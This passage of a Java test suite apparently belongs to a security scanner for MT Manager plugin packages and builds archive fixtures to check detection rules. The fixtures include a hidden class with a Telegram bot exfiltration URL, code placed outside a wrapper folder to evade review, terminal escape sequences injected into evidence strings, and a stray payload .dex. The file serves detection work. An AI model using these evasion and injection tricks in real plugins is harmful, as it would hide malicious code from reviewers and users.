        mt.safety.scanner.Strings chinese = mt.safety.scanner.Strings.forLanguage("zh");
        String[] mustMention = {"quarantine malicious", "remove malicious", "confirm", "cancel"};
        StringBuilder missing = new StringBuilder();
        for (int i = 0; i < mustMention.length; i++) {
            if (!english.commandsHelp().contains(mustMention[i])) {
                missing.append("en:").append(mustMention[i]).append(' ');
            }
            if (!chinese.commandsHelp().contains(mustMention[i])) {
                missing.append("zh:").append(mustMention[i]).append(' ');
            }
        }
        check("both languages document the destructive commands",
                missing.length() == 0, missing.toString());
        check("the two help strings really are different translations",
                !english.commandsHelp().equals(chinese.commandsHelp()),
                "a language branch may have been dropped");

        // A wrapper prefix has to cover the whole package. Rooting at "Plugin/" while other members
        // sit outside it would hide everything outside from the scan, which is a way to carry code
        // past a review.
        Map<String, byte[]> partlyWrapped = new LinkedHashMap<String, byte[]>();
        partlyWrapped.put("Plugin/manifest.json",
                Fixtures.bytes(Fixtures.manifest("x.wrapped", "Wrapped", "demo.A")));
        partlyWrapped.put("Plugin/src/demo/A.java", Fixtures.bytes(benign));
        partlyWrapped.put("Other/src/x/Hidden.java", Fixtures.bytes(
                "package x;\npublic class Hidden {"
                        + " String u = \"https://api.telegram.org/bot9/x\"; }\n"));
        ScanReport partial = scan(fixtures.rawArchive("partly-wrapped.mtp", partlyWrapped, false));
        check("a member outside the wrapper folder is still scanned",
                partial.hasRule("NET003"), summarise(partial));

        // ...while a package that really is wrapped is still unwrapped normally.
        Map<String, byte[]> fullyWrapped = new LinkedHashMap<String, byte[]>();
        fullyWrapped.put("Plugin/manifest.json",
                Fixtures.bytes(Fixtures.manifest("x.fullwrap", "Full Wrap", "demo.A")));
        fullyWrapped.put("Plugin/src/demo/A.java", Fixtures.bytes(benign));
        ScanReport wrapped = scan(fixtures.rawArchive("fully-wrapped.mtp", fullyWrapped, false));
        check("a genuinely wrapped package is still unwrapped",
                "x.fullwrap".equals(wrapped.manifest.pluginId) && wrapped.hasRule("ARC008"),
                wrapped.manifest.pluginId + " :: " + summarise(wrapped));

        // A downloaded .mtp beside the copy installed from it shares an identity by definition.
        File installedCopy = fixtures.directoryPlugin("dl-installed",
                Fixtures.manifest("com.same.tool", "Same Tool", "demo.A"),
                Fixtures.sources("src/demo/A.java", benign));
        Map<String, byte[]> downloadCopy = new LinkedHashMap<String, byte[]>();
        downloadCopy.put("manifest.json",
                Fixtures.bytes(Fixtures.manifest("com.same.tool", "Same Tool", "demo.A")));
        downloadCopy.put("src/demo/A.java", Fixtures.bytes(benign));
        File downloaded = fixtures.rawArchive("same-tool.mtp", downloadCopy, false);
        List<File> both2 = new ArrayList<File>();
        both2.add(installedCopy);
        both2.add(downloaded);
        List<ScanReport> pairReports = new PluginScanner(IocDatabase.empty())
                .scanAll(both2, ScanBudget.unlimited());
        check("a download beside its installed copy is not called impersonation",
                !pairReports.get(0).hasRule("MFT011") && !pairReports.get(1).hasRule("MFT011"),
                summarise(pairReports.get(0)) + " / " + summarise(pairReports.get(1)));

        // Evidence is quoted from the package and printed to a terminal.
        Map<String, byte[]> ansi = new LinkedHashMap<String, byte[]>();
        ansi.put("manifest.json", Fixtures.bytes(Fixtures.manifest("x.ansi", "Ansi", "demo.A")));
        ansi.put("src/demo/A.java", Fixtures.bytes(
                "package demo;\npublic class A { String u = \"https://api.telegram.org/bot\u001b[2J1/x\"; }\n"));
        ScanReport ansiReport = scan(fixtures.rawArchive("ansi.mtp", ansi, false));
        String rendered = ReportFormatter.plainText(ansiReport);
        check("the report carries no terminal escape sequences out of a package",
                rendered.indexOf('\u001b') < 0, "an escape reached the rendered report");

        // Filtering ESC is not enough: to a terminal a lone U+009B is CSI and does the same job.
        Map<String, byte[]> c1 = new LinkedHashMap<String, byte[]>();
        c1.put("manifest.json", Fixtures.bytes(Fixtures.manifest("x.c1", "C1", "demo.A")));
        c1.put("src/demo/A.java", Fixtures.bytes(
                "package demo;\npublic class A { String u = \"https://api.telegram.org/bot\u009b2J1/x\"; }\n"));
        ScanReport c1Report = scan(fixtures.rawArchive("c1.mtp", c1, false));
        String renderedC1 = ReportFormatter.plainText(c1Report);
        check("the C1 controls a terminal acts on are stripped too",
                renderedC1.indexOf('\u009b') < 0 && renderedC1.indexOf('\u009d') < 0,
                "a C1 control reached the rendered report");

        // A zip signature is two bytes, not one.
        check("zip detection requires the whole signature",
                Bytes.looksLikeZip(Fixtures.bytes("PK\u0003\u0004rest"))
                        && !Bytes.looksLikeZip(Fixtures.bytes("PK\u0003Xnot a zip")),
                "PK plus a stray 3 is not a zip");

        // Compiled code is what a plugin SDK v3 package is supposed to contain.
        Map<String, byte[]> v3 = new LinkedHashMap<String, byte[]>();
        v3.put("manifest.json", Fixtures.bytes(
                Fixtures.manifest("x.v3", "V3", "demo.A").replace("\"pluginSdkVersion\": 2",
                        "\"pluginSdkVersion\": 3")));
        v3.put("classes.dex", Fixtures.fakeDex(2048));
        ScanReport v3Report = scan(fixtures.rawArchive("v3.mtp", v3, false));
        check("a v3 package is not flagged for carrying compiled code",
                !v3Report.hasRule("ARC003"), summarise(v3Report));

        // ...but a native library is still not a library archive, at any SDK version.
        Map<String, byte[]> v3Native = new LinkedHashMap<String, byte[]>();
        v3Native.put("manifest.json", Fixtures.bytes(
                Fixtures.manifest("x.v3n", "V3 Native", "demo.A").replace("\"pluginSdkVersion\": 2",
                        "\"pluginSdkVersion\": 3")));
        v3Native.put("libs/libx.so", Fixtures.bytes("\u007fELF payload"));
        ScanReport v3NativeReport = scan(fixtures.rawArchive("v3-native.mtp", v3Native, false));
        check("a native library is still reported in a v3 package",
                v3NativeReport.hasRule("ARC003"), summarise(v3NativeReport));

        // The v3 exemption is only for the usual build outputs. A dex tucked under assets/ is still a
        // payload, and a jar outside libs/ is still outside MT Manager's layout.
        Map<String, byte[]> v3Odd = new LinkedHashMap<String, byte[]>();
        v3Odd.put("manifest.json", Fixtures.bytes(
                Fixtures.manifest("x.v3odd", "V3 Odd", "demo.A").replace("\"pluginSdkVersion\": 2",
                        "\"pluginSdkVersion\": 3")));
        v3Odd.put("assets/payload.dex", Fixtures.fakeDex(2048));
        v3Odd.put("evil.jar", Fixtures.deflatedJar(new LinkedHashMap<String, byte[]>()));
        ScanReport v3OddReport = scan(fixtures.rawArchive("v3-odd.mtp", v3Odd, false));
        check("only the expected compiled outputs are exempt in a v3 package",
                v3OddReport.hasRule("ARC003") && v3OddReport.hasRule("ARC002"), summarise(v3OddReport));

        // Stopping the archive walk early must not invent findings: every member not yet streamed
        // would otherwise look absent from the archive's own data.
        Map<String, byte[]> wide = new LinkedHashMap<String, byte[]>();
        wide.put("manifest.json", Fixtures.bytes(Fixtures.manifest("x.wide", "Wide", "demo.A")));
        wide.put("src/demo/A.java", Fixtures.bytes(benign));
        for (int i = 0; i < 60; i++) {
            wide.put("assets/data" + i + ".txt", Fixtures.bytes("padding padding padding padding\n"));
        }
        File wideArchive = fixtures.rawArchive("wide.mtp", wide, false);
        ScanReport starvedArchive = new PluginScanner(IocDatabase.empty())
                .scan(wideArchive, new ScanBudget(60000L, 256L));
        check("a budget-limited archive walk does not invent structural findings",
                !starvedArchive.hasRule("ARC005"), summarise(starvedArchive));

        // ...while a complete walk still catches the real thing.
        ScanReport completeWalk = scan(wideArchive);
        check("a complete walk still reports nothing wrong with a sound archive",
                !completeWalk.hasRule("ARC005"), summarise(completeWalk));
    }

    private static String readFile(File file) throws java.io.IOException {
        java.io.InputStream in = new java.io.FileInputStream(file);
        try {
            return Bytes.text(Bytes.readAtMost(in, 1 << 20));
        } finally {
            in.close();
        }
    }

    /**
     * True when walking this archive as a stream sees a member with no declared size.
     *
     * <p>Asserted directly, because the fixture is only a test of the inflation guard if it really does
     * withhold its sizes: a writer that filled them in would leave the old summed-size guard working
     * and the test passing for the wrong reason.
     */
    private static boolean sizeIsWithheldWhileWalking(File archive) {
        java.util.zip.ZipInputStream zin = null;
        try {
            zin = new java.util.zip.ZipInputStream(new java.io.FileInputStream(archive));
            java.util.zip.ZipEntry entry;
            while ((entry = zin.getNextEntry()) != null) {
                if (entry.getSize() < 0) {
                    return true;
                }
            }
            return false;
        } catch (java.io.IOException e) {
            return false;
        } finally {
            if (zin != null) {
                try {
                    zin.close();
                } catch (java.io.IOException ignored) {
                    // nothing useful to do while closing
                }
            }
        }
    }

    private static boolean evidenceMentions(ScanReport report, String fragment) {
        List<mt.safety.scanner.core.Signal> signals = report.signals;
        for (int i = 0; i < signals.size(); i++) {
            List<mt.safety.scanner.core.Signal.Evidence> evidence = signals.get(i).evidence();
            for (int j = 0; j < evidence.size(); j++) {
                if (evidence.get(j).where.contains(fragment)) {
                    return true;
                }
            }
        }
        return false;
    }

    private static int countRule(ScanReport report, String ruleId) {
        int count = 0;
        List<mt.safety.scanner.core.Signal> signals = report.signals;
        for (int i = 0; i < signals.size(); i++) {
            if (signals.get(i).ruleId.equals(ruleId)) {
                count++;
            }
        }
        return count;
    }

    // ----------------------------------------------------------- unit checks

    private static void jsonTests() throws Exception {
        Map<String, Object> parsed = Json.parseObject(
                "{\"a\": 1, \"b\": [1, 2, {\"c\": \"x\"}], \"d\": {\"e\": true}, \"f\": null}");
        check("JSON parses nested structures", Json.integer(parsed, "a", -1) == 1, String.valueOf(parsed));

        Map<String, Object> escapes = Json.parseObject("{\"k\": \"line\\nbreak \\u0041 \\\"q\\\"\"}");
        check("JSON handles escapes", "line\nbreak A \"q\"".equals(Json.str(escapes, "k", "")),
                Json.str(escapes, "k", ""));

        check("JSON rejects trailing junk", !parses("{\"a\":1} trailing"), "should have been rejected");
        check("JSON rejects a leading plus on a number", !parses("{\"a\": +1}"),
                "should have been rejected");
        check("JSON rejects other malformed numbers",
                !parses("{\"a\": 01}") && !parses("{\"a\": 1.}") && !parses("{\"a\": .5}")
                        && !parses("{\"a\": 1e}") && !parses("{\"a\": 1-2}"),
                "should have been rejected");
        check("JSON still accepts well-formed numbers",
                parses("{\"a\": -1.5e-3, \"b\": 0, \"c\": 12}"), "should have parsed");
        // 1e309 matches the grammar but overflows a double, and an Infinity reaching Json.integer
        // came back as Integer.MAX_VALUE for whatever an untrusted manifest asked for.
        check("JSON rejects numbers that overflow to infinity",
                !parses("{\"versionCode\": 1e309}") && !parses("{\"a\": -1e309}"),
                "should have been rejected");
        check("JSON rejects unterminated input", !parses("{\"a\": "), "should have been rejected");

        StringBuilder deep = new StringBuilder();
        for (int i = 0; i < 200; i++) {
            deep.append("[");
        }
        check("JSON refuses to recurse without limit", !parses(deep.toString()),
                "deeply nested input should be rejected");

        check("JSON quoting escapes control characters",
                Json.quote("a\"b\\c\nd").equals("\"a\\\"b\\\\c\\nd\""), Json.quote("a\"b\\c\nd"));
    }

    private static void bytesTests() {
        check("Base64 round-trips", "hello world".equals(
                Bytes.text(Bytes.base64Decode(Fixtures.base64(Fixtures.bytes("hello world"))))),
                Bytes.text(Bytes.base64Decode(Fixtures.base64(Fixtures.bytes("hello world")))));
        check("Base64 rejects non-Base64 input", Bytes.base64Decode("not base64 !!!") == null,
                "should have returned null");
        check("entropy tells text from random",
                Bytes.entropy(Fixtures.bytes("aaaaaaaaaaaaaaaaaaaaaaaaaaaa")) < 2.0
                        && Bytes.entropy(Fixtures.highEntropy(8192)) > 7.5,
                Bytes.entropy(Fixtures.highEntropy(8192)) + " vs "
                        + Bytes.entropy(Fixtures.bytes("aaaaaaaaaaaaaaaaaaaaaaaaaaaa")));
        check("magic bytes are recognised",
                Bytes.looksLikeDex(Fixtures.fakeDex(64))
                        && Bytes.looksLikeZip(Fixtures.bytes("PK\u0003\u0004rest"))
                        && !Bytes.looksLikeElf(Fixtures.bytes("plain text")),
                "magic detection");
        check("strings are pulled out of binary",
                Bytes.extractedText(Fixtures.bytes("\u0000\u0001Ljava/lang/Runtime;\u0000\u0002"), 6)
                        .contains("Ljava/lang/Runtime;"), "string extraction");
        check("SHA-256 matches the known value for the empty input",
                "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
                        .equals(Bytes.sha256(new byte[0])), Bytes.sha256(new byte[0]));
    }

    private static void lookalikeHelperTests() {
        check("a one-character difference is confusable",
                mt.safety.scanner.core.ManifestRules.confusable("com.example.tools", "com.exampie.tools"),
                "expected confusable");
        check("homoglyph substitution is seen through",
                mt.safety.scanner.core.ManifestRules.confusable("com.example.tools", "com.example.tools"
                        .replace('o', '\u043e')), "expected confusable");
        check("unrelated names are not confusable",
                !mt.safety.scanner.core.ManifestRules.confusable("com.example.tools", "org.other.thing"),
                "expected not confusable");
        check("short names are not compared",
                !mt.safety.scanner.core.ManifestRules.confusable("ab", "ac"), "expected not confusable");
    }

    // ------------------------------------------------------------- utilities

    private static ScanReport scan(File path) {
        return new PluginScanner(IocDatabase.empty()).scan(path, ScanBudget.unlimited());
    }

    private static boolean parses(String json) {
        try {
            Json.parse(json);
            return true;
        } catch (Json.JsonException e) {
            return false;
        }
    }

    private static String summarise(ScanReport report) {
        StringBuilder sb = new StringBuilder();
        List<mt.safety.scanner.core.Signal> signals = report.signalsBySeverity();
        for (int i = 0; i < signals.size() && i < 6; i++) {
            if (sb.length() > 0) {
                sb.append(", ");
            }
            sb.append(signals.get(i).ruleId);
        }
        return sb.length() == 0 ? "(no findings)" : sb.toString();
    }

    private static void check(String description, boolean condition, String context) {
        if (condition) {
            passed++;
            System.out.println("  ok   " + description);
        } else {
            failures.add(description + "  [" + context + "]");
            System.out.println("  FAIL " + description + "  [" + context + "]");
        }
    }

    private ScannerTest() {
    }
}
